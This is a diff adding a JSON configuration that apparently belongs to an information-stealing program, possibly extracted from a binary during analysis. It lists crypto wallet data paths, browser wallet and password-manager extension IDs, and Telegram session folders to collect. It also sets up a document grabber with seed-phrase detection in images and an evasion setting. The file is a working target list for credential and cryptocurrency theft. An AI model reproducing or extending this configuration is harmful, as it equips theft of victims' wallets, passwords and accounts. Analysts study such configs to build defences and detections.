+    "name": "Bitcoin Core",
+    "paths": [
+     "%APPDATA%\\Bitcoin",
+     "%LOCALAPPDATA%\\Bitcoin"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat"
+    ],
+    "name": "Litecoin Core",
+    "paths": [
+     "%APPDATA%\\Litecoin"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat"
+    ],
+    "name": "Dogecoin Core",
+    "paths": [
+     "%APPDATA%\\Dogecoin"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat"
+    ],
+    "name": "DashCore",
+    "paths": [
+     "%APPDATA%\\DashCore"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*",
+     "*.keys"
+    ],
+    "name": "Monero",
+    "paths": [
+     "%APPDATA%\\bitmonero",
+     "%USERPROFILE%\\Documents\\Monero\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*.json",
+     "*"
+    ],
+    "name": "Wasabi",
+    "paths": [
+     "%APPDATA%\\WalletWasabi\\Client\\Wallets",
+     "%APPDATA%\\WalletWasabi\\Client\\WalletBackups"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Atomic",
+    "paths": [
+     "%APPDATA%\\atomic\\Local Storage\\leveldb",
+     "%APPDATA%\\atomic\\IndexedDB"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Guarda",
+    "paths": [
+     "%APPDATA%\\Guarda\\Local Storage\\leveldb"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Frame",
+    "paths": [
+     "%APPDATA%\\Frame",
+     "%LOCALAPPDATA%\\Frame"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*.wallet",
+     "*"
+    ],
+    "name": "Coinomi",
+    "paths": [
+     "%LOCALAPPDATA%\\Coinomi\\Coinomi\\wallets",
+     "%LOCALAPPDATA%\\Coinomi"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "MyMonero",
+    "paths": [
+     "%APPDATA%\\MyMonero"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "TokenPocket",
+    "paths": [
+     "%APPDATA%\\TokenPocket"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "app.json",
+     "*"
+    ],
+    "name": "Ledger Live",
+    "paths": [
+     "%APPDATA%\\Ledger Live",
+     "%APPDATA%\\Ledger Wallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Trezor Suite",
+    "paths": [
+     "%APPDATA%\\@trezor\\suite-desktop"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Armory",
+    "paths": [
+     "%APPDATA%\\Armory"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Qtum Electrum",
+    "paths": [
+     "%APPDATA%\\Electrum-qtum\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Defichain Electrum",
+    "paths": [
+     "%APPDATA%\\Electrum-DFI\\wallets",
+     "%APPDATA%\\defi-electrum\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Solar",
+    "paths": [
+     "%APPDATA%\\solar-wallet",
+     "%APPDATA%\\Solar Wallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Zap",
+    "paths": [
+     "%APPDATA%\\Zap",
+     "%LOCALAPPDATA%\\Zap"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Bytecoin",
+    "paths": [
+     "%APPDATA%\\bytecoin"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Sparrow",
+    "paths": [
+     "%APPDATA%\\Sparrow"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Jaxx",
+    "paths": [
+     "%APPDATA%\\Jaxx Liberty\\Local Storage\\leveldb",
+     "%APPDATA%\\jaxx\\Local Storage\\leveldb"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "secret.key",
+     "*.key"
+    ],
+    "name": "Daedalus",
+    "paths": [
+     "%APPDATA%\\Daedalus Mainnet\\Secrets-1.0",
+     "%APPDATA%\\Daedalus\\Secrets-1.0"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Feather",
+    "paths": [
+     "%APPDATA%\\feather",
+     "%APPDATA%\\FeatherWallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "btc_wallet",
+     "bsq_wallet",
+     "*.wallet"
+    ],
+    "name": "Bisq",
+    "paths": [
+     "%APPDATA%\\Bisq2",
+     "%APPDATA%\\Bisq"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Specter",
+    "paths": [
+     "%USERPROFILE%\\.specter"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Liana",
+    "paths": [
+     "%APPDATA%\\Liana"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Nunchuk",
+    "paths": [
+     "%APPDATA%\\Nunchuk"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Stack Wallet",
+    "paths": [
+     "%APPDATA%\\com.cypherstack\\Stack Wallet",
+     "%APPDATA%\\stackwallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "Preferences",
+     "Secure Preferences",
+     "Local State"
+    ],
+    "name": "Brave Wallet",
+    "paths": [
+     "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data",
+     "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser-Beta\\User Data",
+     "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser-Nightly\\User Data",
+     "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser-Dev\\User Data"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Blockstream Green",
+    "paths": [
+     "%LOCALAPPDATA%\\Blockstream\\Green",
+     "%APPDATA%\\Blockstream\\Green"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "BitBox",
+    "paths": [
+     "%APPDATA%\\bitbox"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat",
+     "zecwallet-light-wallet.dat"
+    ],
+    "name": "Zcash",
+    "paths": [
+     "%APPDATA%\\Zcash"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Zecwallet Lite",
+    "paths": [
+     "%APPDATA%\\Zecwallet Lite"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Cake Wallet",
+    "paths": [
+     "%APPDATA%\\com.cakewallet.cake_wallet\\Cake Wallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Alby Hub",
+    "paths": [
+     "%LOCALAPPDATA%\\albyhub"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Decred",
+    "paths": [
+     "%LOCALAPPDATA%\\Decrediton",
+     "%LOCALAPPDATA%\\Dcrwallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.dat"
+    ],
+    "name": "Firo",
+    "paths": [
+     "%APPDATA%\\firo"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electrum-FIRO",
+    "paths": [
+     "%APPDATA%\\Electrum-FIRO\\wallets"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "wallet.db",
+     "beam-wallet.cfg"
+    ],
+    "name": "Beam",
+    "paths": [
+     "%LOCALAPPDATA%\\Beam Wallet"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Electrum-DASH",
+    "paths": [
+     "%APPDATA%\\Electrum-DASH\\wallets",
+     "%APPDATA%\\Electrum-DASH"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "Haveno-reto",
+    "paths": [
+     "%APPDATA%\\Haveno-reto"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*"
+    ],
+    "name": "OneKey",
+    "paths": [
+     "%APPDATA%\\@onekeyhq\\desktop",
+     "%APPDATA%\\OneKey",
+     "%LOCALAPPDATA%\\OneKey"
+    ],
+    "recursive": true
+   },
+   {
+    "files": [
+     "*.keys",
+     "*.wallet",
+     "*"
+    ],
+    "name": "Zano",
+    "paths": [
+     "%APPDATA%\\Zano",
+     "%APPDATA%\\zano",
+     "%LOCALAPPDATA%\\Zano"
+    ],
+    "recursive": true
+   },
+   {
+    "comment": "Mining app - full AppData except cache. Contains kryptex.db (account+balance), DIPS/Cookies (session), Local State (key).",
+    "files": [
+     "*"
+    ],
+    "name": "Kryptex",
+    "paths": [
+     "%APPDATA%\\Kryptex"
+    ]
+   },
+   {
+    "files": [
+     "*.json",
+     "*.db",
+     "*.sqlite",
+     "Local State",
+     "Preferences",
+     "*"
+    ],
+    "name": "NiceHash",
+    "paths": [
+     "%APPDATA%\\NiceHashMiner",
+     "%APPDATA%\\NiceHash Miner 3",
+     "%APPDATA%\\NiceHashMiner Legacy"
+    ]
+   },
+   {
+    "comment": "Electron mining app - salad.io account/earnings",
+    "files": [
+     "*"
+    ],
+    "name": "Salad",
+    "paths": [
+     "%APPDATA%\\Salad"
+    ]
+   },
+   {
+    "files": [
+     "*.json",
+     "*.db",
+     "Local State",
+     "Preferences",
+     "*"
+    ],
+    "name": "CudoMiner",
+    "paths": [
+     "%APPDATA%\\CudoMiner",
+     "%APPDATA%\\Cudo Miner"
+    ]
+   }
+  ],
+  "filters": {
+   "max_file_size_bytes": 52428800,
+   "profile_names": [
+    "*"
+   ],
+   "skip_symlinks": true
+  },
+  "firefox_extensions": [
+   {
+    "id": "webextension@metamask.io",
+    "name": "MetaMask"
+   },
+   {
+    "id": "webextension-flask@metamask.io",
+    "name": "MetaMask"
+   },
+   {
+    "id": "{7c42eea1-b3e4-4be4-a56f-82a5852b12dc}",
+    "name": "Phantom"
+   },
+   {
+    "id": "firefox@phantom.app",
+    "name": "Phantom"
+   },
+   {
+    "id": "rabby-wallet@rabby.io",
+    "name": "Rabby"
+   },
+   {
+    "id": "hnfanknocfeofbddgcijnmhnfnkdnaad@chromium-extension",
+    "name": "Coinbase"
+   },
+   {
+    "id": "cc00602b-41f4-4b01-8acb-33cb185f4ba6",
+    "name": "Coinbase"
+   },
+   {
+    "id": "{530f7c6c-6077-4703-8f71-cb368c663e35}",
+    "name": "Yoroi"
+   },
+   {
+    "id": "ronin-wallet@axieinfinity.com",
+    "name": "Ronin"
+   },
+   {
+    "id": "wallet@tonkeeper.com",
+    "name": "Tonkeeper"
+   },
+   {
+    "id": "{98fcdaee-2b58-4f71-8a3c-f0c66f24dede}",
+    "name": "MyTonWallet"
+   },
+   {
+    "id": "{6d72262a-b243-4dc6-8f4f-be96c74e0a86}",
+    "name": "Solflare"
+   },
+   {
+    "id": "keplr-extension@keplr.app",
+    "name": "Keplr"
+   },
+   {
+    "id": "browserextension@rainbow.me",
+    "name": "Rainbow"
+   },
+   {
+    "id": "master@zerion.io",
+    "name": "Zerion"
+   },
+   {
+    "id": "{f5727e03-b26c-41e0-95dd-7e315ff16410}",
+    "name": "Talisman"
+   },
+   {
+    "id": "{a0c6ccfd-26a3-4df4-9729-aa036070ad29}",
+    "name": "Braavos"
+   },
+   {
+    "id": "{8a3a53f5-7490-46d7-b91d-f8549bb8df05}",
+    "name": "SubWallet"
+   },
+   {
+    "id": "support@wavesplatform.com",
+    "name": "Keeper"
+   },
+   {
+    "id": "{21a9e8ea-7aa4-4aae-923c-ec8211f2779c}",
+    "name": "Enkrypt"
+   },
+   {
+    "id": "wallet@ambire.com",
+    "name": "Ambire"
+   },
+   {
+    "id": "vultisig-extension@vultisig.com",
+    "name": "Vultisig"
+   },
+   {
+    "id": "extension@getalby.com",
+    "name": "Alby"
+   },
+   {
+    "id": "lace-wallet-ext@lace.io",
+    "name": "Lace"
+   }
+  ],
+  "firefox_profile_roots": [
+   "%APPDATA%\\Mozilla\\Firefox",
+   "%APPDATA%\\Mozilla\\Firefox Developer Edition",
+   "%APPDATA%\\Floorp",
+   "%APPDATA%\\librewolf",
+   "%APPDATA%\\Waterfox",
+   "%APPDATA%\\zen",
+   "%APPDATA%\\Moonchild Productions\\Pale Moon",
+   "%APPDATA%\\Thunderbird"
+  ],
+  "ignore_extensions": [
+   {
+    "id": "lmjnegcaeklhafolokijcfjliaokphfk",
+    "name": "Video DownloadHelper"
+   },
+   {
+    "id": "jabjbhgjaidecageckilhonbggakppme",
+    "name": "Gosplugin"
+   },
+   {
+    "id": "kdbmhfkmnlmbkgbabkdealhhbfhlmmon",
+    "name": "SteamDB"
+   },
+   {
+    "id": "kepdippgcikacmcdaijnponnfgljfbea",
+    "name": "ZenMate VPN"
+   },
+   {
+    "id": "fdcgdnkidjaadafnichfpabhfomcebme",
+    "name": "ZenMate VPN"
+   },
+   {
+    "id": "dnioaagdjgpcokckfpokpndoblenmfcg",
+    "name": "VOT Voice Over Translation"
+   },
+   {
+    "id": "ihaofaplfphbjkmhkigdkgfhoipgiodg",
+    "name": "Opera GX Mod"
+   },
+   {
+    "id": "bhmmomiinigofkjcapegjjndpbikblnp",
+    "name": "WOT"
+   },
+   {
+    "id": "ohbcnndddkciekhceemkinkkabollnod",
+    "name": "Adreva Network"
+   },
+   {
+    "id": "hjknpdomhlodgaebegjopkmfafjpbblg",
+    "name": "SteamDB"
+   },
+   {
+    "id": "emikbbbebcdfohonlaifafnoanocnebl",
+    "name": "minerBlock"
+   },
+   {
+    "id": "jmkaglaafmhbcpleggkmaliipiilhldn",
+    "name": "Video DownloadHelper"
+   },
+   {
+    "id": "iiclaphjclecagpkkaacljnpcppnoibi",
+    "name": "WOT"
+   },
+   {
+    "id": "hcpjjgofimlapfckgdbhnihhekodmoon",
+    "name": "DiWi FogPlay"
+   },
+   {
+    "id": "pgfbdgicjmhenccemcijooffohcdanic",
+    "name": "BankID CryptoPlugin"
+   },
+   {
+    "id": "nopflpjffmdlioccdjkhkdgbgfmkcpbd",
+    "name": "TradeWiz"
+   },
+   {
+    "id": "dneaknblefhakfhakkoeelipgkipjfmb",
+    "name": "Transcrypto"
+   },
+   {
+    "id": "mloajfnmjckfjbeeofcdaecbelnblden",
+    "name": "Snap&Read"
+   },
+   {
+    "id": "ajaaioiiekongmlakdbellaoglnffmoh",
+    "name": "Widgetify"
+   },
+   {
+    "id": "pcgkmkjdikhiodinhloioejnpjgmfigd",
+    "name": "Avira Phantom VPN"
+   }
+  ],
+  "output_layout": {
+   "desktop_template": "{name}",
+   "extension_template": "{name}/{browser}_{profile}",
+   "include_local_storage_with_extensions": true
+  },
+  "password_extensions": [
+   {
+    "id": "nngceckbapebfimnlniiiahkandclblb",
+    "name": "Bitwarden"
+   },
+   {
+    "id": "jbkfoedolllekgbhcbcoahefnbanhhlh",
+    "name": "Bitwarden"
+   },
+   {
+    "id": "eiaeiblijfjekdanodkjadfinkhbfgcd",
+    "name": "NordPass"
+   },
+   {
+    "id": "hdokiejnpimakedhajhdlcegeplioahd",
+    "name": "LastPass"
+   },
+   {
+    "id": "bbcinlkgjjkejfdpemiealijmmooekmp",
+    "name": "LastPass"
+   },
+   {
+    "id": "aeblfdkhhhdcdjpifhhbdiojplfjncoa",
+    "name": "1Password"
+   },
+   {
+    "id": "dppgmdbiimibapkepcbdbmkaabgiofem",
+    "name": "1Password"
+   },
+   {
+    "id": "fdjamakpfbbddfjaooikfcpapjohcfmg",
+    "name": "Dashlane"
+   },
+   {
+    "id": "gehmmocbbkpblljhkekmfhjpfbkclbph",
+    "name": "Dashlane"
+   },
+   {
+    "id": "oboonakemofpalcgghocfoadofidjkkk",
+    "name": "KeePassXC-Browser"
+   },
+   {
+    "id": "ghmbeldphafepmbegfdldplolciloijh",
+    "name": "Proton Pass"
+   },
+   {
+    "id": "bfbnijldejengipcepfcgcclfnepdjcm",
+    "name": "Keeper"
+   },
+   {
+    "id": "lfochlioelphaglamdcakfjemolpichk",
+    "name": "Keeper"
+   },
+   {
+    "id": "mpfckamfocjknfipmpjdkkebpnieooca",
+    "name": "Keeper"
+   },
+   {
+    "id": "bfogiafebfohielmmehodmfbbebbbpei",
+    "name": "Keeper"
+   },
+   {
+    "id": "pnlccmojcmeohlpggmfnbbiapkmbliob",
+    "name": "RoboForm"
+   },
+   {
+    "id": "jfkebfiedoofhjobkmkfcamcdefaikgp",
+    "name": "Avira Password Manager"
+   },
+   {
+    "id": "oakginmjipboeflcgnbipnjojnpchnpd",
+    "name": "NordPass"
+   },
+   {
+    "id": "acpoiecbbljdnhbhphocpedadhgpjcng",
+    "name": "AuthNest"
+   }
+  ]
+ },
+ "grabber_config (file offset 0x23a5e1)": {
+  "allowed_extensions": [
+   ".txt",
+   ".log",
+   ".pdf",
+   ".doc",
+   ".docx",
+   ".xls",
+   ".xlsx",
+   ".json",
+   ".csv",
+   ".ini",
+   ".cfg",
+   ".conf",
+   ".rdp",
+   ".ovpn",
+   ".ppk",
+   ".kdbx",
+   ".wallet",
+   ".dat",
+   ".key",
+   ".keys",
+   ".seco",
+   ".backup",
+   ".png",
+   ".jpg",
+   ".jpeg",
+   ".bmp",
+   ".tif",
+   ".tiff",
+   ".webp",
+   ".gif",
+   ".heic",
+   ".heif",
+   ".rtf",
+   ".odt"
+  ],
+  "allowed_roots": [
+   "%USERPROFILE%\\Desktop",
+   "%USERPROFILE%\\Рабочий стол",
+   "%USERPROFILE%\\Documents",
+   "%USERPROFILE%\\Документы",
+   "%USERPROFILE%\\Мои документы",
+   "%USERPROFILE%\\Downloads",
+   "%USERPROFILE%\\Загрузки"
+  ],
+  "copy_locked_files": true,
+  "evasion_profile": "balanced",
+  "max_depth": 2,
+  "max_file_size_bytes": 2097152,
+  "max_total_bytes": 20971520,
+  "min_file_size_bytes": 1,
+  "output": {
+   "archive_prefix": "Grab"
+  },
+  "seed_image_detection": {
+   "bip39_wordlist_path": "bip39_english.txt",
+   "doc_extensions": [
+    ".pdf",
+    ".docx",
+    ".odt"
+   ],
+   "enabled": true,
+   "image_extensions": [
+    ".png",
+    ".jpg",
+    ".jpeg",
+    ".bmp",
+    ".tif",
+    ".tiff",
+    ".webp",
+    ".gif",
+    ".heic",
+    ".heif"
+   ],
+   "max_height": 8192,
+   "max_width": 8192,
+   "min_bip39_consecutive": 9,
+   "min_bip39_words": 9,
+   "min_height": 200,
+   "min_total_words": 12,
+   "min_width": 200,
+   "text_extensions": [
+    ".txt",
+    ".md",
+    ".log",
+    ".rtf"
+   ]
+  },
+  "skip_hidden": true,
+  "skip_symlinks": true,
+  "tdata_scan": {
+   "drive_relative_paths": [
+    "Telegram/tdata",
+    "Telegram Desktop/tdata",
+    "Telegram Beta/tdata",
+    "AyuGram/tdata",
+    "AyuGram Desktop/tdata",
+    "Kotatogram/tdata",
+    "64Gram/tdata",
+    "Tdata/tdata",
+    "Portable/Telegram/tdata",
+    "Portable/Telegram Desktop/tdata",
+    "Portable/AyuGram/tdata",
+    "Programs/Telegram/tdata",
+    "Apps/Telegram/tdata",
+    "Tools/Telegram/tdata",
+    "Soft/Telegram/tdata",
+    "Games/Telegram/tdata"
+   ],
+   "extra_scan_relative_paths": [
+    "Telegram/tdata",
+    "Telegram Desktop/tdata",
+    "Telegram Beta/tdata",
+    "AyuGram/tdata",
+    "AyuGram Desktop/tdata",
+    "Kotatogram/tdata",
+    "64Gram/tdata",
+    "Forkgram/tdata",
+    "Portable/Telegram/tdata",
+    "Portable/Telegram Desktop/tdata",
+    "Portable/AyuGram/tdata",
+    "Apps/Telegram/tdata",
+    "Programs/Telegram/tdata",
+    "Tools/Telegram/tdata"
+   ],
+   "extra_scan_roots": [
+    "%USERPROFILE%\\Desktop",
+    "%USERPROFILE%\\Downloads",
+    "%USERPROFILE%\\Documents",
+    "%USERPROFILE%\\Загрузки",
+    "%USERPROFILE%\\Рабочий стол",
+    "%USERPROFILE%\\OneDrive\\Desktop",
+    "%USERPROFILE%\\OneDrive\\Downloads",
+    "%USERPROFILE%\\OneDrive\\Загрузки",
+    "%USERPROFILE%\\OneDrive\\Рабочий стол"
+   ],
+   "extra_scan_seconds": 8,
+   "home_relative_paths": [
+    "Desktop/Telegram/tdata",
+    "Desktop/Telegram Desktop/tdata",
+    "Desktop/Tdata/tdata",
+    "Desktop/AyuGram/tdata",
+    "Downloads/Telegram Desktop/tdata",
+    "Downloads/Telegram/tdata",
+    "Downloads/AyuGram/tdata",
+    "Загрузки/Telegram Desktop/tdata",
+    "Загрузки/Telegram/tdata",
+    "Загрузки/AyuGram/tdata",
+    "Рабочий стол/Telegram/tdata",
+    "Рабочий стол/Telegram Desktop/tdata",
+    "Рабочий стол/AyuGram/tdata",
+    "Documents/Telegram/tdata"
+   ],
+   "max_drive_seconds": 8,
+   "max_roots": 48,
+   "portable_exe_names": [
+    "Telegram.exe",
+    "TelegramDesktop.exe",
+    "TelegramBeta.exe",
+    "AyuGram.exe",
+    "Kotatogram.exe",
+    "64Gram.exe",
+    "Forkgram.exe",
+    "MaterialGram.exe",
+    "Teleglow.exe",
+    "FAgram.exe",
+    "Yurigram.exe",
+    "Yukigram.exe",
+    "iMe.exe",
+    "Nagram.exe",
+    "PlusMessenger.exe",
+    "Unigram.exe"
+   ],
+   "portable_scan_depth": 3,
+   "portable_scan_max_dirs": 800,
+   "portable_shallow_children": 48,
+   "profile_dirs": [
+    "Telegram Desktop",
+    "Telegram Desktop A",
+    "Telegram Desktop B",
+    "Telegram Desktop C",
+    "Telegram Desktop UWP",
+    "Telegram Desktop Beta",
+    "Telegram Beta",
+    "AyuGram Desktop",
+    "AyuGram",
+    "Kotatogram",
+    "Kotatogram Desktop",
+    "64Gram",
+    "64Gram Desktop",
+    "TDesktop-x64",
+    "Forkgram",
+    "Forkgram Desktop",
+    "MaterialGram",
+    "MaterialGram Desktop",
+    "Teleglow",
+    "Teleglow Desktop",
+    "FAgram",
+    "FAgram Desktop",
+    "Fagram",
+    "Yurigram",
+    "Yurigram Desktop",
+    "Yukigram",
+    "iMe Desktop",
+    "iMe",
+    "Plus Messenger Desktop",
+    "Plus Messenger",
+    "Nagram Desktop",
+    "Nagram",
+    "TelegramDesktop",
+    "tdesktop",
+    "Telegram"
+   ],
+   "scan_all_drives": true
+  }
+ }
+}
